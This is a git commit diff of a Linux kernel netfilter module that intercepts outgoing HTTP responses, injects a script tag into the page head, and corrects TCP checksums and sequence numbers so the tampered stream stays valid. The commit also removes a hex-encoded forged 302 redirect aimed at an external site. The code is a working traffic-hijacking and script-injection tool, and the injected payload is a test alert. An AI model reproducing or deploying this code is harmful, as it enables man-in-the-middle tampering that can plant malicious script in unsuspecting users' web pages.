6c30748fd5161cf88c87127319dd4ba4240aceaa
songboyu <soongboyu@gmail.com>
2016-08-28 04:06:50 +0800

    fix

--- Makefile
+++ Makefile
@@ -3,5 +3,3 @@ KDIR := /lib/modules/$(shell uname -r)/build
 PWD := $(shell pwd)
 default:
 	$(MAKE) -C $(KDIR) M=$(PWD) modules
-
-
--- hook_ipv4.c
+++ hook_ipv4.c
@@ -1,5 +1,4 @@
 #include <linux/module.h>
-#include <linux/moduleparam.h>
 #include <linux/kernel.h>
 #include <linux/netfilter.h>
 #include <linux/netfilter_ipv4.h>
@@ -13,20 +12,14 @@
 #include <net/ip.h>
 #include <net/tcp.h>
 
-#include <net/checksum.h>
-#include <net/route.h>
-
 #include <net/netfilter/nf_conntrack.h>
 #include <net/netfilter/nf_conntrack_helper.h>
-#include <net/netfilter/nf_conntrack_ecache.h>
 #include <net/netfilter/nf_conntrack_expect.h>
 #include <net/netfilter/nf_nat.h>
 #include <net/netfilter/nf_nat_core.h>
 #include <net/netfilter/nf_nat_helper.h>
 
 char shellcode[] = "<head><script>alert('hijacking test!')</script>";
-char target_ip[] = "\xb6\xfe\xe3\xcc";
-char hack_str[] = "\x48\x54\x54\x50\x2f\x31\x2e\x31\x20\x33\x30\x32\x20\x46\x6f\x75\x6e\x64\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x4c\x65\x6e\x67\x74\x68\x3a\x20\x31\x36\x30\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65\x3a\x20\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c\x0d\x0a\x44\x61\x74\x65\x3a\x20\x4d\x6f\x6e\x2c\x20\x31\x36\x20\x4d\x61\x79\x20\x32\x30\x31\x36\x20\x30\x38\x3a\x32\x34\x3a\x33\x32\x20\x47\x4d\x54\x0d\x0a\x4C\x6F\x63\x61\x74\x69\x6F\x6E\x3A\x20\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x68\x69\x74\x68\x79\x2E\x63\x6E\x2F\x74\x65\x73\x74\x2E\x68\x74\x6D\x6C\x0D\x0A\x53\x65\x72\x76\x65\x72\x3a\x20\x41\x70\x61\x63\x68\x65\x0d\x0a\x0d\x0a\x3c\x68\x74\x6d\x6c\x3e\x0d\x0a\x3c\x68\x65\x61\x64\x3e\x3c\x74\x69\x74\x6c\x65\x3e\x33\x30\x32\x20\x46\x6f\x75\x6e\x64\x3c\x2f\x74\x69\x74\x6c\x65\x3e\x3c\x2f\x68\x65\x61\x64\x3e\x0d\x0a\x3c\x62\x6f\x64\x79\x20\x62\x67\x63\x6f\x6c\x6f\x72\x3d\x22\x77\x68\x69\x74\x65\x22\x3e\x0d\x0a\x3c\x63\x65\x6e\x74\x65\x72\x3e\x3c\x68\x31\x3e\x33\x30\x32\x20\x46\x6f\x75\x6e\x64\x3c\x2f\x68\x31\x3e\x3c\x2f\x63\x65\x6e\x74\x65\x72\x3e\x0d\x0a\x3c\x68\x72\x3e\x3c\x63\x65\x6e\x74\x65\x72\x3e\x6e\x67\x69\x6e\x78\x2f\x31\x2e\x32\x2e\x34\x3c\x2f\x63\x65\x6e\x74\x65\x72\x3e\x0d\x0a\x3c\x2f\x62\x6f\x64\x79\x3e\x0d\x0a\x3c\x2f\x68\x74\x6d\x6c\x3e\x0d\x0a";
 
 typedef struct Pseudo_Header {
 	unsigned int saddr;
@@ -88,21 +81,21 @@ unsigned short checksum_tcp(struct iphdr *ip_hd, struct tcphdr *tcph)
 	return ret; 
 }
 
-int delete_padding(char *buf)
-{
-	char *pl = NULL;
-	char *pr = NULL;
+// int delete_padding(char *buf)
+// {
+// 	char *pl = NULL;
+// 	char *pr = NULL;
 	
-	pl = strstr(buf,"<");
-	pr = strstr(buf,">");
-	if(pl != NULL && pr != NULL)
-	{
-		if((long long)pl - (long long)pr > 0)
-		{
-			memset(buf,' ',(long long)pl - (long long)buf);
-		}
-	}
-}
+// 	pl = strstr(buf,"<");
+// 	pr = strstr(buf,">");
+// 	if(pl != NULL && pr != NULL)
+// 	{
+// 		if((long long)pl - (long long)pr > 0)
+// 		{
+// 			memset(buf,' ',(long long)pl - (long long)buf);
+// 		}
+// 	}
+// }
 
 // int check_insert(char *pkg)
 // {
@@ -162,19 +155,23 @@ unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct n
 	unsigned short tol_len = ntohs(iph->tot_len);
 
 	if (iph->protocol == IPPROTO_TCP)
-	{
-		struct tcphdr *tcph = tcp_hdr(skb);
+	{	
+		struct tcphdr *tcph = (void *)iph + iph->ihl * 4;
 		unsigned int src_ip = (unsigned int)iph->saddr;
 		unsigned int dest_ip = (unsigned int)iph->daddr;
 
 		unsigned int src_port = (unsigned int)ntohs(tcph->source);
 		unsigned int dest_port = (unsigned int)ntohs(tcph->dest);
+		// printk(KERN_ALERT "hook_ipv4: %pI4:%d --> %pI4:%d \n", &src_ip, src_port, &dest_ip, dest_port);
 
-		char *pkg = (char *)((long long)tcph + ((tcph->doff) * 4));
-		
+		if (0 != skb_linearize(skb)) {
+            return NF_ACCEPT;
+        }
+		// char *pkg = (char *)((long long)tcph + ((tcph->doff) * 4));
+		char *pkg = (char *)skb->data + 40;
+
 		if (src_port == 80)
 		{
-
 			if (memcmp(pkg,"HTTP/1.1",8) != 0)
 			{
 				return NF_ACCEPT;
@@ -193,10 +190,14 @@ unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct n
 			if(phead == NULL){
 				return NF_ACCEPT;
 			}
+			printk(KERN_ALERT "hook_ipv4: Found Head tag\n");
 			// sudo iptables -t nat --list
-			if (ct && nf_nat_mangle_tcp_packet(skb, ct, ctinfo, iph_len,
+			if (ct && nf_nat_mangle_tcp_packet(skb, ct, ctinfo,
                                         phead - pkg, 6,
-                                        shellcode, strlen(shellcode))) {
+                                        shellcode, strlen(shellcode))) 
+			{
+                skb->local_df = 1;
+            	skb_shinfo(skb)->gso_size = 0;
                 printk("insert success\n");
             }
 		}
@@ -209,13 +210,171 @@ unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct n
 			
 			delete_encoding(pkg);
 		}
-
-		unsigned short cs = checksum_tcp(iph, tcph);
-		tcph->check = cs;
+		// unsigned short cs = checksum_tcp(iph, tcph);
+		// tcph->check = cs;
+		struct rtable *rt = skb_rtable(skb);
+		//计算校验和，参考内核源码 的net/ipv4/tcp_ipv4.c tcp_v4_send_check函数
+        //和net/ipv4/netfilter/nf_nat_helper.c nf_nat_mangle_tcp_packet 函数
+                        //和net/netfilter/xt_TCPMSS.c 的 tcpmss_mangle_packet 函数
+        int datalen = skb->len - iph->ihl * 4;
+        int oldlen = datalen - 9;
+        if (skb->ip_summed != CHECKSUM_PARTIAL) {
+            if (!(rt->rt_flags & RTCF_LOCAL) && skb->dev->features
+                    & NETIF_F_V4_CSUM) {
+                skb->ip_summed = CHECKSUM_PARTIAL;
+                skb->csum_start = skb_headroom(skb)
+                        + skb_network_offset(skb) + iph->ihl * 4;
+                skb->csum_offset = offsetof(struct tcphdr, check);
+                tcph->check = ~tcp_v4_check(datalen, iph->saddr,
+                        iph->daddr, 0);
+            } else {
+                tcph->check = 0;
+                tcph->check = tcp_v4_check(datalen, iph->saddr,
+                        iph->daddr, csum_partial(tcph, datalen, 0));
+            }
+        } else
+            inet_proto_csum_replace2(&tcph->check, skb, htons(oldlen),
+                    htons(datalen), 1);
 	}
 	return NF_ACCEPT;
 }
 
+/* Adjust one found SACK option including checksum correction */
+static void
+sack_adjust(struct sk_buff *skb,
+	    struct tcphdr *tcph,
+	    unsigned int sackoff,
+	    unsigned int sackend,
+	    struct nf_nat_seq *natseq)
+{
+	while (sackoff < sackend) {
+		struct tcp_sack_block_wire *sack;
+		__be32 new_start_seq, new_end_seq;
+
+		sack = (void *)skb->data + sackoff;
+		if (after(ntohl(sack->start_seq) - natseq->offset_before,
+			  natseq->correction_pos))
+			new_start_seq = htonl(ntohl(sack->start_seq)
+					- natseq->offset_after);
+		else
+			new_start_seq = htonl(ntohl(sack->start_seq)
+					- natseq->offset_before);
+
+		if (after(ntohl(sack->end_seq) - natseq->offset_before,
+			  natseq->correction_pos))
+			new_end_seq = htonl(ntohl(sack->end_seq)
+				      - natseq->offset_after);
+		else
+			new_end_seq = htonl(ntohl(sack->end_seq)
+				      - natseq->offset_before);
+
+		pr_debug("sack_adjust: start_seq: %d->%d, end_seq: %d->%d\n",
+			 ntohl(sack->start_seq), new_start_seq,
+			 ntohl(sack->end_seq), new_end_seq);
+
+		inet_proto_csum_replace4(&tcph->check, skb,
+					 sack->start_seq, new_start_seq, 0);
+		inet_proto_csum_replace4(&tcph->check, skb,
+					 sack->end_seq, new_end_seq, 0);
+		sack->start_seq = new_start_seq;
+		sack->end_seq = new_end_seq;
+		sackoff += sizeof(*sack);
+	}
+}
+
+/* TCP SACK sequence number adjustment */
+static inline unsigned int
+nf_nat_sack_adjust(struct sk_buff *skb,
+		   struct tcphdr *tcph,
+		   struct nf_conn *ct,
+		   enum ip_conntrack_info ctinfo)
+{
+	unsigned int dir, optoff, optend;
+	struct nf_conn_nat *nat = nfct_nat(ct);
+
+	optoff = ip_hdrlen(skb) + sizeof(struct tcphdr);
+	optend = ip_hdrlen(skb) + tcph->doff * 4;
+
+	if (!skb_make_writable(skb, optend))
+		return 0;
+
+	dir = CTINFO2DIR(ctinfo);
+
+	while (optoff < optend) {
+		/* Usually: option, length. */
+		unsigned char *op = skb->data + optoff;
+
+		switch (op[0]) {
+		case TCPOPT_EOL:
+			return 1;
+		case TCPOPT_NOP:
+			optoff++;
+			continue;
+		default:
+			/* no partial options */
+			if (optoff + 1 == optend ||
+			    optoff + op[1] > optend ||
+			    op[1] < 2)
+				return 0;
+			if (op[0] == TCPOPT_SACK &&
+			    op[1] >= 2+TCPOLEN_SACK_PERBLOCK &&
+			    ((op[1] - 2) % TCPOLEN_SACK_PERBLOCK) == 0)
+				sack_adjust(skb, tcph, optoff+2,
+					    optoff+op[1], &nat->seq[!dir]);
+			optoff += op[1];
+		}
+	}
+	return 1;
+}
+
+/* TCP sequence number adjustment.  Returns 1 on success, 0 on failure */
+int
+nf_nat_seq_adjust(struct sk_buff *skb,
+		  struct nf_conn *ct,
+		  enum ip_conntrack_info ctinfo)
+{
+	struct tcphdr *tcph;
+	int dir;
+	__be32 newseq, newack;
+	s16 seqoff, ackoff;
+	struct nf_conn_nat *nat = nfct_nat(ct);
+	struct nf_nat_seq *this_way, *other_way;
+
+	dir = CTINFO2DIR(ctinfo);
+
+	this_way = &nat->seq[dir];
+	other_way = &nat->seq[!dir];
+
+	if (!skb_make_writable(skb, ip_hdrlen(skb) + sizeof(*tcph)))
+		return 0;
+
+	tcph = (void *)skb->data + ip_hdrlen(skb);
+	if (after(ntohl(tcph->seq), this_way->correction_pos))
+		seqoff = this_way->offset_after;
+	else
+		seqoff = this_way->offset_before;
+
+	if (after(ntohl(tcph->ack_seq) - other_way->offset_before,
+		  other_way->correction_pos))
+		ackoff = other_way->offset_after;
+	else
+		ackoff = other_way->offset_before;
+
+	newseq = htonl(ntohl(tcph->seq) + seqoff);
+	newack = htonl(ntohl(tcph->ack_seq) - ackoff);
+
+	inet_proto_csum_replace4(&tcph->check, skb, tcph->seq, newseq, 0);
+	inet_proto_csum_replace4(&tcph->check, skb, tcph->ack_seq, newack, 0);
+
+	printk(KERN_ALERT "Adjusting sequence number from %u->%u, ack from %u->%u\n",
+		 ntohl(tcph->seq), ntohl(newseq), ntohl(tcph->ack_seq),
+		 ntohl(newack));
+
+	tcph->seq = newseq;
+	tcph->ack_seq = newack;
+
+	return nf_nat_sack_adjust(skb, tcph, ct, ctinfo);
+}
 
 unsigned int fix_seq(unsigned int hooknum, struct sk_buff *skb,
         const struct net_device *in, const struct net_device *out, int(*okfn)(
@@ -227,25 +386,11 @@ unsigned int fix_seq(unsigned int hooknum, struct sk_buff *skb,
     //is invoked after the raw table has been processed, but before the mangle table.
     //所以下面 要指定.priority = NF_IP_PRI_MANGLE  nf_ct_get 才会返回有效的值
     struct nf_conn *ct = nf_ct_get(skb, &ctinfo);
-
-    //调用nf_nat_seq_adjust函数，修正nf_nat_mangle_tcp_packet 之后造成的tcp包的序列号不对问题
-    //这个需要在修改后的双向网络包上都要进行，所以需要hook双向的吧？，nf_nat_mangle_tcp_packet
-    //中调用了adjust_tcp_sequence知识记录下了应该作的修改。
-    //因为nf_nat_mangle_tcp_packet  给需要进行序号修正的conntrack加上IPS_SEQ_ADJUST_BIT标志了。
-    //所以这里判断是不是这个标志就进行修改。不知道这会不会和其他nat helper moudle冲突，如果别人也用这个
-    //标志时就可能出现重复修改等问题，因为里面的序号调整结构都是通用的。
-    //也许进行更细致的检查，比如给conntrack的ct结构加上 其他唯一的status标志比较好一点，
-    //反正就是要保证我们要修复序号的包是我们前面用nf_nat_mangle_tcp_packet
-    //修改过包内容的那个连接的，而不是其他的连接的包。
-    //写一个nat helper module来修改tcp包也许比在这种hook module里面进行修改更合适。去看看netfilter的文档看看。
-    //因为我确信自己系统  没有运行nat help module，所以为了简单就这样进行修改了，测试过没有什么问题。
-    //最好研究一下nat conntrack的那些代码，我也不是清楚具体的细节。
-
-	// printk(KERN_ALERT "pre nf_nat_seq_adjust\n");
+    
     if (ct  &&  test_bit(IPS_SEQ_ADJUST_BIT, &ct->status)
             && (ctinfo != IP_CT_RELATED + IP_CT_IS_REPLY)  ) {
-        // nf_nat_seq_adjust(skb, ct, ctinfo);
-    	printk(KERN_ALERT "nf_nat_seq_adjust]n");
+        nf_nat_seq_adjust(skb, ct, ctinfo);
+    	// printk(KERN_ALERT "nf_nat_seq_adjust\n");
     }
 
     return NF_ACCEPT;
@@ -254,31 +399,28 @@ unsigned int fix_seq(unsigned int hooknum, struct sk_buff *skb,
 
 static struct nf_hook_ops http_hooks = 
 { 
-	.pf = NFPROTO_IPV4, /*IPV4 协议的*/
-    .priority = NF_IP_PRI_MANGLE , // NF_IP_PRI_FIRST, //NF_IP_PRI_LAST ;NF_IP_PRI_NAT_SRC ;
-    .hooknum = NF_INET_POST_ROUTING, /* NF_IP_LOCAL_OUT 我们只处理出去的网路包 */
+	.pf = NFPROTO_IPV4,
+    .priority = NF_IP_PRI_MANGLE, 
+    .hooknum = NF_INET_POST_ROUTING, 
     .hook = hook_func,
-    .owner = THIS_MODULE, 
 };
 
 static struct nf_hook_ops seq_adjust[] = {
     {
 	    .hook           = fix_seq,
-	    .owner          = THIS_MODULE,
 	    .pf             = PF_INET,
-	    .hooknum        = NF_INET_LOCAL_OUT,
+	    .hooknum        = NF_INET_LOCAL_IN,
     	.priority       = NF_IP_PRI_CONNTRACK_CONFIRM,
     },
     {
         .hook           = fix_seq,
-        .owner          = THIS_MODULE,
         .pf             = PF_INET,
-        .hooknum        = NF_INET_LOCAL_IN,
+        .hooknum        = NF_INET_POST_ROUTING,
         .priority       = NF_IP_PRI_CONNTRACK_CONFIRM,
     },
 };
 
-int init_hook(void)
+int init_module(void)
 {
 	nf_register_hooks(seq_adjust, ARRAY_SIZE(seq_adjust));
 	nf_register_hook(&http_hooks);
@@ -288,13 +430,10 @@ int init_hook(void)
 	return 0;
 }
 
-void cleanup_hook(void)
+void cleanup_module(void)
 {
 	nf_unregister_hooks(seq_adjust, ARRAY_SIZE(seq_adjust));
 	nf_unregister_hook(&http_hooks);
 
 	printk(KERN_ALERT "hook_ipv4: rmmod\n");
 }
-
-module_init(init_hook);
-module_exit(cleanup_hook);
